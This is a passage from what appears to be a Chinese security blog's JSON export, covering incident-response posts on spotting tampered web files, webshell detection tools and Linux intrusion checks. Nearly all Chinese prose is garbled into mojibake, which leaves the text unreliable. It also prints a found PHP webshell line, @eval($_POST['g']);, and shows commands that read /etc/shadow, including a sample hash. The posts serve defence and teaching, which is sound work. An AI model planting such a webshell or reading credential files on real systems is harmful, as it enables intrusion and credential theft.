·ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€è¡Œå‘½ä»¤å¿«é€Ÿæ‰¾å‡ºä¸¤ä¸ªé¡¹ç›®æ–‡ä»¶çš„å·®å¼‚ã€‚ diff -c -a -r cms1 cms2 å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå‰ä¸‰è¡Œåˆ—å‡ºäº†ä¸¤ä¸ªè¦å¯¹æ¯”çš„æ–‡ä»¶ç›®å½•çš„å·®å¼‚ï¼Œå¯ä»¥å‘ç° low.php æ–‡ä»¶è¢«ç¯¡æ”¹è¿‡ï¼Œç¯¡æ”¹çš„å†…å®¹æ˜¯ @eval($_POST[&#39;g&#39;]); å¤‡æ³¨ï¼šå¦‚æœåªæ˜¯æƒ³æŸ¥çœ‹ä¸¤ä¸ªæ–‡ä»¶æ˜¯å¦ä¸åŒåˆä¸æƒ³æ˜¾ç¤ºå·®å¼‚ä¹‹å¤„çš„è¯ï¼Œå¯ä»¥åŠ ä¸Š -q é€‰é¡¹ã€‚ 3ã€ç‰ˆæœ¬æ§åˆ¶å·¥å…·ç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œæ¯”å¦‚è¯´ gitï¼Œé‡æ–°ä¸Šä¼ ä»£ç åˆ° gitï¼Œadd+commit+pushï¼Œç„¶åæ‰“å¼€é¡¹ç›®ï¼Œç‚¹å‡» commitsï¼Œåœ¨å†å²æäº¤ç‰ˆæœ¬é‡Œé¢ï¼ŒæŸ¥çœ‹æ–‡ä»¶æ›´æ”¹å†…å®¹ï¼Œå¾ˆå®¹æ˜“å°±å¯ä»¥å‘ç°ä»£ç è¢«ç¯¡æ”¹çš„åœ°æ–¹äº†ã€‚ å¦å¤–ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ git diff ç”¨æ¥æ¯”è¾ƒæ–‡ä»¶ä¹‹é—´çš„ä¸åŒã€‚ 4ã€æ–‡ä»¶å¯¹æ¯”å·¥å…·å…³é”®è¯ï¼šä»£ç å¯¹æ¯”å·¥å…·ï¼Œä½ ä¼šæ‰¾åˆ°å¾ˆå¤šå¥½ç”¨çš„å·¥å…·ï¼Œè¿™é‡Œæˆ‘ä»¬æ¨èä¸¤æ¬¾æ•ˆæœè¿˜ä¸é”™çš„å·¥å…·ï¼ŒBeyond Compare å’Œ WinMergeã€‚ ï¼ˆ1ï¼‰Beyond CompareBeyond Compare æ˜¯ä¸€å¥—ç”± Scooter Software æ¨å‡ºçš„æ–‡ä»¶æ¯”è¾ƒå·¥å…·ã€‚ä¸»è¦ç”¨é€”æ˜¯å¯¹æ¯”ä¸¤ä¸ªæ–‡ä»¶å¤¹æˆ–è€…æ–‡ä»¶ï¼Œå¹¶å°†å·®å¼‚ä»¥é¢œè‰²æ ‡ç¤ºï¼Œæ¯”è¾ƒèŒƒå›´åŒ…æ‹¬ç›®å½•ï¼Œæ–‡æ¡£å†…å®¹ç­‰ã€‚ ä¸‹è½½åœ°å€ï¼šhttp://www.scootersoftware.com/download.php è½¯ä»¶ä½¿ç”¨ç¤ºä¾‹ï¼Œé€šè¿‡æ–‡ä»¶å¤¹æ¯”è¾ƒï¼Œæ‰¾å‡ºæ–‡ä»¶å¤¹ä¸­çš„å·®å¼‚å†…å®¹ã€‚ åŒå‡» Beyond Compare ï¼Œæ‰“å¼€è½¯ä»¶ä¸»é¡µï¼Œé€‰æ‹©æ–‡ä»¶å¤¹æ¯”è¾ƒã€‚ åœ¨åŒè¾¹æ è¾“å…¥æ–‡ä»¶å¤¹è·¯å¾„ï¼Œç‚¹å‡»æ˜¾ç¤ºå·®åˆ«ï¼Œåˆ—å‡ºå·®å¼‚éƒ¨åˆ†çš„å†…å®¹ï¼Œç´«è‰²éƒ¨åˆ†ä¸ºæ–°å¢æ–‡ä»¶ï¼Œçº¢è‰²éƒ¨åˆ†ä¸ºç¯¡æ”¹æ–‡ä»¶ã€‚ åŒå‡»å…·ä½“æ–‡ä»¶ï¼Œè¿›å…¥ä»£ç å¯¹æ¯”ï¼Œæ‰¾åˆ°ä»£ç å·®å¼‚éƒ¨åˆ†ã€‚ ï¼ˆ2ï¼‰WinMergeWinMerge æ˜¯ä¸€æ¬¾è¿è¡Œäº Windows ç³»ç»Ÿä¸‹çš„æ–‡ä»¶æ¯”è¾ƒå’Œåˆå¹¶å·¥å…·ï¼Œä½¿ç”¨å®ƒå¯ä»¥éå¸¸æ–¹ä¾¿åœ°æ¯”è¾ƒæ–‡ä»¶å¤¹å’Œæ–‡ä»¶ï¼Œä»¥æ˜“äºç†è§£çš„å¯è§†æ–‡æœ¬æ ¼å¼æ˜¾ç¤ºå·®å¼‚ã€‚ ä¸‹è½½åœ°å€ï¼šhttps://winmerge.org/downloads/ æ–‡ä»¶ â€“ æ‰“å¼€ï¼Œé€‰æ‹©æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ï¼Œç„¶åç‚¹å‡»è¿›è¡Œæ¯”è¾ƒã€‚ åœ¨åŒä¸€ä¸ªç•Œé¢é‡Œï¼Œé€šè¿‡é¢œè‰²å’Œæ–‡æœ¬æç¤ºï¼Œæ˜¾ç¤ºæ–‡ä»¶å¤¹å†…å®¹å·®å¼‚ã€‚","categories":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"https://wolke.cn/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"https://wolke.cn/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"author":"w01ke"},{"title":"å¸¸è§çš„WebShellæŸ¥æ€å·¥å…·","slug":"å¸¸è§çš„WebShellæŸ¥æ€å·¥å…·","date":"2022-04-01T13:15:38.000Z","updated":"2022-04-01T13:57:31.052Z","comments":true,"path":"post/2812b919.html","link":"","permalink":"https://wolke.cn/post/2812b919.html","excerpt":"","text":"ä¸€ã€å‰è¨€å½“ç½‘ç«™æœåŠ¡å™¨è¢«å…¥ä¾µæ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä¸€æ¬¾Webshellæ£€æµ‹å·¥å…·ï¼Œæ¥å¸®åŠ©æˆ‘ä»¬å‘ç°webshellï¼Œè¿›ä¸€æ­¥æ’æŸ¥ç³»ç»Ÿå¯èƒ½å­˜åœ¨çš„å®‰å…¨æ¼æ´ã€‚ æœ¬æ–‡æ¨èäº†10æ¬¾ WebShell æ£€æµ‹å·¥å…·ï¼Œç”¨äºç½‘ç«™å…¥ä¾µæ’æŸ¥ã€‚å½“ç„¶ï¼Œç›®å‰å¸‚åœºä¸Šçš„å¾ˆå¤šä¸»æœºå®‰å…¨äº§å“ä¹Ÿéƒ½æä¾›è¿™ç§ WebShell æ£€æµ‹èƒ½åŠ›ï¼Œæ¯”å¦‚é˜¿é‡Œäº‘ã€é’è—¤äº‘ã€safedog ç­‰ï¼Œæœ¬æ–‡æš‚ä¸è®¨è®ºã€‚ äºŒã€å¸¸è§WebshellæŸ¥æ€å·¥å…·1ã€Dç›¾_WebæŸ¥æ€é˜¿Då‡ºå“ï¼Œä½¿ç”¨è‡ªè¡Œç ”å‘ä¸åˆ†æ‰©å±•åçš„ä»£ç åˆ†æå¼•æ“ï¼Œèƒ½åˆ†ææ›´ä¸ºéšè—çš„ WebShell åé—¨è¡Œä¸ºã€‚ å…¼å®¹æ€§ï¼šåªæä¾› Windows ç‰ˆæœ¬ã€‚ å·¥å…·ä¸‹è½½åœ°å€ï¼šhttp://www.d99net.net 2ã€ç™¾åº¦ WEBDIR+ä¸‹ä¸€ä»£ WebShell æ£€æµ‹å¼•æ“ï¼Œé‡‡ç”¨å…ˆè¿›çš„åŠ¨æ€ç›‘æµ‹æŠ€æœ¯ï¼Œç»“åˆå¤šç§å¼•æ“é›¶è§„åˆ™æŸ¥æ€ã€‚ å…¼å®¹æ€§ï¼šæä¾›åœ¨çº¿æŸ¥æ€æœ¨é©¬ï¼Œå…è´¹å¼€æ”¾ API æ”¯æŒæ‰¹é‡æ£€æµ‹ã€‚ åœ¨çº¿æŸ¥æ€åœ°å€ï¼šhttps://scanner.baidu.com 3ã€æ²³é©¬ä¸“æ³¨ WebShell æŸ¥æ€ç ”ç©¶ï¼Œæ‹¥æœ‰æµ·é‡ WebShell æ ·æœ¬å’Œè‡ªä¸»æŸ¥æ€æŠ€æœ¯ï¼Œé‡‡ç”¨ä¼ ç»Ÿç‰¹å¾+äº‘ç«¯å¤§æ•°æ®åŒå¼•æ“çš„æŸ¥æ€æŠ€æœ¯ã€‚æŸ¥æ€é€Ÿåº¦å¿«ã€ç²¾åº¦é«˜ã€è¯¯æŠ¥ä½ã€‚ å…¼å®¹æ€§ï¼šæ”¯æŒ Windowsã€Linuxï¼Œæ”¯æŒåœ¨çº¿æŸ¥æ€ã€‚ å®˜æ–¹ç½‘ç«™ï¼šhttps://www.shellpub.com 4ã€Web Shell DetectorWeb Shell Detector å…·æœ‰ WebShell ç­¾åæ•°æ®åº“ï¼Œå¯å¸®åŠ©è¯†åˆ«é«˜è¾¾ 99ï¼… çš„ WebShellã€‚ å…¼å®¹æ€§ï¼šæä¾› PHPã€Python è„šæœ¬ï¼Œå¯è·¨å¹³å°ï¼Œåœ¨çº¿æ£€æµ‹ã€‚ å®˜æ–¹ç½‘ç«™ï¼šhttp://www.shelldetector.com githubé¡¹ç›®åœ°å€ï¼šhttps://github.com/emposha/PHP-Shell-Detector 5ã€CloudWalkerï¼ˆç‰§äº‘ï¼‰ä¸€ä¸ªå¯æ‰§è¡Œçš„å‘½ä»¤è¡Œç‰ˆæœ¬ Webshell æ£€æµ‹å·¥å…·ã€‚ç›®å‰ï¼Œé¡¹ç›®å·²åœæ­¢æ›´æ–°ã€‚ å…¼å®¹æ€§ï¼šæä¾› Linuxç‰ˆæœ¬ï¼ŒWindows æš‚ä¸æ”¯æŒã€‚ åœ¨çº¿æŸ¥æ€ demoï¼šhttps://webshellchop.chaitin.cn GitHub é¡¹ç›®åœ°å€ï¼šhttps://github.com/chaitin/cloudwalker 6ã€Sangfor WebShellKillSangfor WebShellKill (ç½‘ç«™åé—¨æ£€æµ‹å·¥å…·)æ˜¯ä¸€æ¬¾ Web åé—¨ä¸“æ€å·¥å…·ï¼Œä¸ä»…æ”¯æŒ WebShell çš„æ‰«æï¼ŒåŒæ—¶è¿˜æ”¯æŒæš—é“¾çš„æ‰«æã€‚æ˜¯ä¸€æ¬¾èåˆäº†å¤šé‡æ£€æµ‹å¼•æ“çš„æŸ¥æ€å·¥å…·ã€‚èƒ½æ›´ç²¾å‡†åœ°æ£€æµ‹å‡ºWEBç½‘ç«™å·²çŸ¥å’ŒæœªçŸ¥çš„åé—¨æ–‡ä»¶ã€‚ å…¼å®¹æ€§ï¼šæ”¯æŒ Windowsã€linux å·¥å…·ä¸‹è½½åœ°å€ï¼šhttp://edr.sangfor.com.cn/backdoor_detection.htmlï¼ˆå·²åœæ­¢è®¿é—®ï¼‰ 7ã€æ·±åº¦å­¦ä¹ æ¨¡å‹æ£€æµ‹ PHP Webshellä¸€ä¸ªæ·±åº¦å­¦ä¹  PHP WebShell æŸ¥æ€å¼•æ“ demoï¼Œæä¾›åœ¨çº¿æ ·æœ¬æ£€æµ‹ã€‚ åœ¨çº¿æŸ¥æ€åœ°å€ï¼šhttp://webshell.cdxy.me 8ã€PHP Malware FinderPHP-malware-finder æ˜¯ä¸€æ¬¾ä¼˜ç§€çš„æ£€æµ‹webshellå’Œæ¶æ„è½¯ä»¶æ··æ·†ä»£ç çš„å·¥å…· å…¼å®¹æ€§ï¼šæä¾›Linux ç‰ˆæœ¬ï¼ŒWindows æš‚ä¸æ”¯æŒã€‚ GitHub é¡¹ç›®åœ°å€ï¼šhttps://github.com/jvoisin/php-malware-finder 9ã€findWebshellè¿™ä¸ªé¡¹ç›®æ˜¯ä¸€æ¬¾åŸºäº Python å¼€å‘çš„ WebShell æ£€æŸ¥å·¥å…·ï¼Œå¯ä»¥æ ¹æ®ç‰¹å¾ç åŒ¹é…æ£€æŸ¥ä»»æ„ç±»å‹çš„ WebShell åé—¨ã€‚ GitHub é¡¹ç›®åœ°å€ï¼šhttps://github.com/he1m4n6a/findWebshell 10ã€åœ¨çº¿ WebShell æŸ¥æ€å·¥å…·åœ¨çº¿æŸ¥æ€åœ°å€ï¼šhttp://tools.bugscaner.com/killwebshell","categories":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"https://wolke.cn/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"https://wolke.cn/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"author":"w01ke"},{"title":"Linuxå…¥ä¾µæ’æŸ¥","slug":"Linuxå…¥ä¾µæ’æŸ¥","date":"2022-03-31T11:08:33.000Z","updated":"2022-03-31T11:18:43.104Z","comments":true,"path":"post/af6fba30.html","link":"","permalink":"https://wolke.cn/post/af6fba30.html","excerpt":"","text":"ä¸€ã€å‰è¨€å½“ä¼ä¸šå‘ç”Ÿé»‘å®¢å…¥ä¾µã€ç³»ç»Ÿå´©æºƒæˆ–å…¶å®ƒå½±å“ä¸šåŠ¡æ­£å¸¸è¿è¡Œçš„å®‰å…¨äº‹ä»¶æ—¶ï¼Œæ€¥éœ€ç¬¬ä¸€æ—¶é—´è¿›è¡Œå¤„ç†ï¼Œä½¿ä¼ä¸šçš„ç½‘ç»œä¿¡æ¯ç³»ç»Ÿåœ¨æœ€çŸ­æ—¶é—´å†…æ¢å¤æ­£å¸¸å·¥ä½œï¼Œè¿›ä¸€æ­¥æŸ¥æ‰¾å…¥ä¾µæ¥æºï¼Œè¿˜åŸå…¥ä¾µäº‹æ•…è¿‡ç¨‹ï¼ŒåŒæ—¶ç»™å‡ºè§£å†³æ–¹æ¡ˆä¸é˜²èŒƒæªæ–½ï¼Œä¸ºä¼ä¸šæŒ½å›æˆ–å‡å°‘ç»æµæŸå¤±ã€‚ é’ˆå¯¹å¸¸è§çš„æ”»å‡»äº‹ä»¶ï¼Œç»“åˆå·¥ä½œä¸­åº”æ€¥å“åº”äº‹ä»¶åˆ†æå’Œè§£å†³çš„æ–¹æ³•ï¼Œæ€»ç»“äº†ä¸€äº› Linux æœåŠ¡å™¨å…¥ä¾µæ’æŸ¥çš„æ€è·¯ã€‚ äºŒã€å…¥ä¾µæ’æŸ¥æ€è·¯1ã€è´¦å·å®‰å…¨ï¼ˆ1ï¼‰åŸºæœ¬ä½¿ç”¨â‘  ç”¨æˆ·ä¿¡æ¯æ–‡ä»¶[root@VM-0-15-centos ~]# cat /etc/passwdroot:x:0:0:root:/root:/bin/bashaccount:password:UID:GID:GECOS:directory:shellç”¨æˆ·åï¼šå¯†ç ï¼šç”¨æˆ·IDï¼šç»„IDï¼šç”¨æˆ·è¯´æ˜ï¼šå®¶ç›®å½•ï¼šç™»é™†ä¹‹åçš„ shellæ³¨æ„ï¼šæ— å¯†ç åªå…è®¸æœ¬æœºç™»é™†ï¼Œè¿œç¨‹ä¸å…è®¸ç™»é™† â‘¡ å½±å­æ–‡ä»¶[root@VM-0-15-centos ~]# cat /etc/shadowroot:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::ç”¨æˆ·åï¼šåŠ å¯†å¯†ç ï¼šå¯†ç æœ€åä¸€æ¬¡ä¿®æ”¹æ—¥æœŸï¼šä¸¤æ¬¡å¯†ç çš„ä¿®æ”¹æ—¶é—´é—´éš”ï¼šå¯†ç æœ‰æ•ˆæœŸï¼šå¯†ç ä¿®æ”¹åˆ°æœŸåˆ°çš„è­¦å‘Šå¤©æ•°ï¼šå¯†ç è¿‡æœŸä¹‹åçš„å®½é™å¤©æ•°ï¼šè´¦å·å¤±æ•ˆæ—¶é—´ï¼šä¿ç•™ â‘¢ å¸¸ç”¨å‘½ä»¤who æŸ¥çœ‹å½“å‰ç™»å½•ç”¨æˆ·ï¼ˆtty æœ¬åœ°ç™»é™† pts è¿œç¨‹ç™»å½•ï¼‰w æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ï¼Œæƒ³çŸ¥é“æŸä¸€æ—¶åˆ»ç”¨æˆ·çš„è¡Œä¸ºuptime æŸ¥çœ‹ç™»é™†å¤šä¹…ã€å¤šå°‘ç”¨æˆ·ï¼Œè´Ÿè½½çŠ¶æ€ ï¼ˆ2ï¼‰å…¥ä¾µæ’æŸ¥â‘  æŸ¥è¯¢ç‰¹æƒç”¨æˆ·ç‰¹æƒç”¨æˆ·(uid ä¸º0)awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwdå°†/etc/passwdæ–‡ä»¶å†…å®¹ä»¥:ä¸ºåˆ†å‰²ç¬¦ï¼Œè¿‡æ»¤å‡ºç¬¬3åˆ—ï¼ˆå³uidï¼‰ä¸º0çš„ç¬¬1åˆ—ï¼ˆç”¨æˆ·åï¼‰çš„æ•°æ® â‘¡ æŸ¥è¯¢å¯ä»¥è¿œç¨‹ç™»å½•çš„å¸å·ä¿¡æ¯awk &#x27;/\\$1|\\$6/&#123;print $1&#125;&#x27; /etc/shadow/etc/shadowæ–‡ä»¶å†…å®¹ä¸­ï¼Œç­›é€‰å‡ºä¸€è¡Œä¸­åŒ…å«$1æˆ–$6çš„çš„è¡Œæ•°æ® â‘¢ é™¤rootå¸å·å¤–ï¼Œå…¶ä»–å¸å·æ˜¯å¦å­˜åœ¨sudoæƒé™é™¤rootå¸å·å¤–ï¼Œå…¶ä»–å¸å·æ˜¯å¦å­˜åœ¨sudoæƒé™ã€‚å¦‚éç®¡ç†éœ€è¦ï¼Œæ™®é€šå¸å·åº”åˆ é™¤sudoæƒé™ more /etc/sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL=(ALL)&quot;grep -v åè½¬æŸ¥æ‰¾ï¼Œè¾“å‡ºé™¤åŒ¹é…é¡¹ä¹‹å¤–çš„æ‰€æœ‰è¡Œï¼Œè¿™é‡Œçš„åŒ¹é…é¡¹æ˜¯#æˆ–$å¼€å¤´çš„ï¼Œä¸»è¦æ˜¯ä¸ºäº†å»é™¤æ‰root â‘£ ç¦ç”¨æˆ–åˆ é™¤å¤šä½™åŠå¯ç–‘çš„å¸å·usermod -L user ç¦ç”¨å¸å·ï¼Œå¸å·æ— æ³•ç™»å½•ï¼Œ/etc/shadow ç¬¬äºŒæ ä¸º ! å¼€å¤´userdel user åˆ é™¤ user ç”¨æˆ·userdel -r user å°†åˆ é™¤ user ç”¨æˆ·ï¼Œå¹¶ä¸”å°† /home ç›®å½•ä¸‹çš„ user ç›®å½•ä¸€å¹¶åˆ é™¤ 2ã€å†å²å‘½ä»¤ï¼ˆ1ï¼‰åŸºæœ¬ä½¿ç”¨â‘  rootç”¨æˆ·çš„å†å²å‘½ä»¤historycat /root/.bash_history â‘¡ æŸ¥çœ‹.bash_historyæ–‡ä»¶æŸ¥çœ‹å¸å·æ‰§è¡Œè¿‡çš„ç³»ç»Ÿå‘½ä»¤æ‰“å¼€ /home å„å¸å·ç›®å½•ä¸‹çš„ .bash_historyï¼ŒæŸ¥çœ‹æ™®é€šå¸å·æ‰§è¡Œçš„å†å²å‘½ä»¤ã€‚ cat /root/username/.bash_history ã€ä¿å­˜1ä¸‡æ¡å‘½ä»¤ã€‘ sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profileåˆ©ç”¨ sed æŠŠHISTSIZE=1000æ›¿æ¢æˆHISTSIZE=10000 ã€åœ¨/etc/profileçš„æ–‡ä»¶å°¾éƒ¨æ·»åŠ å¦‚ä¸‹è¡Œæ•°é…ç½®ä¿¡æ¯ã€‘ ######jiagu history xianshi#########USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`if [ &quot;$USER_IP&quot; = &quot;&quot; ]thenUSER_IP=`hostname`fiexport HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;shopt -s histappendexport PROMPT_COMMAND=&quot;history -a&quot;######### jiagu history xianshi ########## ã€source /etc/profile è®©é…ç½®ç”Ÿæ•ˆã€‘ [root@VM-0-15-centos ~]# source /etc/profile[root@VM-0-15-centos ~]# historyç”Ÿæˆæ•ˆæœï¼š 1 2018-07-10 19:45:39 192.168.204.1 root source /etc/profile å†å²æ“ä½œå‘½ä»¤çš„æ¸…é™¤ï¼šhistory -c ä½†æ­¤å‘½ä»¤å¹¶ä¸ä¼šæ¸…é™¤ä¿å­˜åœ¨æ–‡ä»¶ä¸­çš„è®°å½•ï¼Œå› æ­¤éœ€è¦æ‰‹åŠ¨åˆ é™¤ .bash_profile æ–‡ä»¶ä¸­çš„è®°å½•ã€‚ ï¼ˆ2ï¼‰å…¥ä¾µæ’æŸ¥è¿›å…¥ç”¨æˆ·ç›®å½•ä¸‹ï¼Œå¯¼å‡ºå†å²å‘½ä»¤ã€‚ cat .bash_history &gt;&gt; history.txt 3ã€æ£€æŸ¥å¼‚å¸¸ç«¯å£ä½¿ç”¨ netstat ç½‘ç»œè¿æ¥å‘½ä»¤ï¼Œåˆ†æå¯ç–‘ç«¯å£ã€IPã€PID netstat -antlp | more æŸ¥çœ‹ä¸‹ pid æ‰€å¯¹åº”çš„è¿›ç¨‹æ–‡ä»¶è·¯å¾„ ls -l /proc/$PID/exeæˆ–file /proc/$PID/exeï¼ˆ$PID ä¸ºå¯¹åº”çš„ pid å·ï¼‰ 4ã€æ£€æŸ¥å¼‚å¸¸è¿›ç¨‹ä½¿ç”¨ ps å‘½ä»¤ï¼Œåˆ†æè¿›ç¨‹ ps aux | grep pida æ˜¾ç¤ºç°è¡Œç»ˆç«¯æœºä¸‹çš„æ‰€æœ‰ç¨‹åºï¼ŒåŒ…æ‹¬å…¶ä»–ç”¨æˆ·çš„ç¨‹åºã€‚u ä»¥ç”¨æˆ·ä¸ºä¸»çš„æ ¼å¼æ¥æ˜¾ç¤ºç¨‹åºçŠ¶å†µã€‚x æ˜¾ç¤ºæ‰€æœ‰ç¨‹åºï¼Œä¸ä»¥ç»ˆç«¯æœºæ¥åŒºåˆ†ã€‚ 5ã€æ£€æŸ¥å¼€æœºå¯åŠ¨é¡¹ï¼ˆ1ï¼‰åŸºæœ¬ä½¿ç”¨ç³»ç»Ÿè¿è¡Œçº§åˆ«ç¤ºæ„å›¾ï¼š è¿è¡Œçº§åˆ« å«ä¹‰ 0 å…³æœº 1 å•ç”¨æˆ·æ¨¡å¼ï¼Œå¯ä»¥æƒ³è±¡ä¸ºwindowsçš„å®‰å…¨æ¨¡å¼ï¼Œä¸»è¦ç”¨äºç³»ç»Ÿä¿®å¤ 2 ä¸å®Œå…¨çš„å‘½ä»¤è¡Œæ¨¡å¼ï¼Œä¸å«NFSæœåŠ¡ 3 å®Œå…¨çš„å‘½ä»¤è¡Œæ¨¡å¼ï¼Œå°±æ˜¯æ ‡å‡†å­—ç¬¦ç•Œé¢ 4 ç³»ç»Ÿä¿ç•™ 5 å›¾å½¢æ¨¡å¼ 6 é‡å¯åŠ¨ æŸ¥çœ‹è¿è¡Œçº§åˆ«å‘½ä»¤ runlevel ç³»ç»Ÿé»˜è®¤å…è®¸çº§åˆ« vi /etc/inittabid=3ï¼šinitdefault #ç³»ç»Ÿå¼€æœºåç›´æ¥è¿›å…¥å“ªä¸ªè¿è¡Œçº§åˆ« å¼€æœºå¯åŠ¨é…ç½®æ–‡ä»¶ /etc/rc.local/etc/rc.d/rc[0~6].d ä¾‹å­ï¼šå½“æˆ‘ä»¬éœ€è¦å¼€æœºå¯åŠ¨è‡ªå·±çš„è„šæœ¬æ—¶ï¼Œåªéœ€è¦å°†å¯æ‰§è¡Œè„šæœ¬ä¸¢åœ¨ /etc/init.d ç›®å½•ä¸‹ï¼Œç„¶ååœ¨ /etc/rc.d/rc*.d æ–‡ä»¶ä¸­å»ºç«‹è½¯é“¾æ¥å³å¯ã€‚ æ³¨ï¼šæ­¤ä¸­çš„ * ä»£è¡¨ 0,1,2,3,4,5,6 è¿™ä¸ƒä¸ªç­‰çº§ root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh æ­¤å¤„sshdæ˜¯å…·ä½“æœåŠ¡çš„è„šæœ¬æ–‡ä»¶ï¼ŒS100sshæ˜¯å…¶è½¯é“¾æ¥ï¼ŒSå¼€å¤´ä»£è¡¨åŠ è½½æ—¶è‡ªå¯åŠ¨ï¼›å¦‚æœæ˜¯Kå¼€å¤´çš„è„šæœ¬æ–‡ä»¶ï¼Œä»£è¡¨è¿è¡Œçº§åˆ«åŠ è½½æ—¶éœ€è¦å…³é—­çš„ã€‚ ï¼ˆ2ï¼‰å…¥ä¾µæ’æŸ¥å¯åŠ¨é¡¹æ–‡ä»¶ï¼š more /etc/rc.local/etc/rc.d/rc[0~6].dls -l /etc/rc.d/rc3.d/ 6ã€æ£€æŸ¥å®šæ—¶ä»»åŠ¡ï¼ˆ1ï¼‰åŸºæœ¬ä½¿ç”¨â‘  åˆ©ç”¨ crontab åˆ›å»ºè®¡åˆ’ä»»åŠ¡åŸºæœ¬å‘½ä»¤ crontab -l åˆ—å‡ºæŸä¸ªç”¨æˆ·cronæœåŠ¡çš„è¯¦ç»†å†…å®¹Tipsï¼šé»˜è®¤ç¼–å†™çš„crontabæ–‡ä»¶ä¼šä¿å­˜åœ¨ (/var/spool/cron/ç”¨æˆ·å ä¾‹å¦‚: /var/spool/cron/rootcrontab -r åˆ é™¤æ¯ä¸ªç”¨æˆ·crontä»»åŠ¡(è°¨æ…ï¼šåˆ é™¤æ‰€æœ‰çš„è®¡åˆ’ä»»åŠ¡)crontab -e ä½¿ç”¨ç¼–è¾‘å™¨ç¼–è¾‘å½“å‰çš„crontabæ–‡ä»¶ å¦‚ï¼š*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt æ¯åˆ†é’Ÿå†™å…¥æ–‡ä»¶ â‘¡ åˆ©ç”¨ anacron å‘½ä»¤å®ç°å¼‚æ­¥å®šæ—¶ä»»åŠ¡è°ƒåº¦ä½¿ç”¨æ¡ˆä¾‹ æ¯å¤©è¿è¡Œ /home/backup.sh è„šæœ¬ï¼švi /etc/anacrontab @daily 10 example.daily /bin/bash /home/backup.shå½“æœºå™¨åœ¨ backup.sh æœŸæœ›è¢«è¿è¡Œæ—¶æ˜¯å…³æœºçš„ï¼Œanacronä¼šåœ¨æœºå™¨å¼€æœºååˆ†é’Ÿä¹‹åè¿è¡Œå®ƒï¼Œè€Œä¸ç”¨å†ç­‰å¾… 7å¤©ã€‚ ï¼ˆ2ï¼‰å…¥ä¾µæ’æŸ¥é‡ç‚¹å…³æ³¨ä»¥ä¸‹ç›®å½•ä¸­æ˜¯å¦å­˜åœ¨æ¶æ„è„šæœ¬ /var/spool/cron/* /etc/crontab/etc/cron.d/*/etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/*/etc/cron.weekly//etc/anacrontab/var/spool/anacron/* å°æŠ€å·§ï¼š more /etc/cron.daily/* æŸ¥çœ‹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ 7ã€æ£€æŸ¥æœåŠ¡ï¼ˆ1ï¼‰æœåŠ¡è‡ªå¯åŠ¨ç¬¬ä¸€ç§ä¿®æ”¹æ–¹æ³•ï¼š chkconfig [--level è¿è¡Œçº§åˆ«] [ç‹¬ç«‹æœåŠ¡å] [on|off]chkconfig â€“level 2345 httpd on å¼€å¯è‡ªå¯åŠ¨chkconfig httpd on ï¼ˆé»˜è®¤levelæ˜¯2345ï¼‰ ç¬¬äºŒç§ä¿®æ”¹æ–¹æ³•ï¼š ä¿®æ”¹ /etc/re.d/rc.local æ–‡ä»¶ åŠ å…¥ /etc/init.d/httpd start ç¬¬ä¸‰ç§ä¿®æ”¹æ–¹æ³•ï¼šä½¿ç”¨ ntsysv å‘½ä»¤ç®¡ç†è‡ªå¯åŠ¨ï¼Œå¯ä»¥ç®¡ç†ç‹¬ç«‹æœåŠ¡å’Œ xinetd æœåŠ¡ã€‚ ï¼ˆ2ï¼‰å…¥ä¾µæ’æŸ¥â‘  æŸ¥è¯¢å·²å®‰è£…çš„æœåŠ¡RPM åŒ…å®‰è£…çš„æœåŠ¡ chkconfig --list æŸ¥çœ‹æœåŠ¡è‡ªå¯åŠ¨çŠ¶æ€ï¼Œå¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„RPMåŒ…å®‰è£…çš„æœåŠ¡ps aux | grep crond æŸ¥çœ‹å½“å‰æœåŠ¡ç³»ç»Ÿåœ¨3ä¸5çº§åˆ«ä¸‹çš„å¯åŠ¨é¡¹ ä¸­æ–‡ç¯å¢ƒchkconfig --list | grep &quot;3:å¯ç”¨\\|5:å¯ç”¨&quot;è‹±æ–‡ç¯å¢ƒchkconfig --list | grep &quot;3:on\\|5:on&quot; æºç åŒ…å®‰è£…çš„æœåŠ¡ æŸ¥çœ‹æœåŠ¡å®‰è£…ä½ç½® ï¼Œä¸€èˆ¬æ˜¯åœ¨/user/local/service httpd startæœç´¢/etc/rc.d/init.d/ æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ 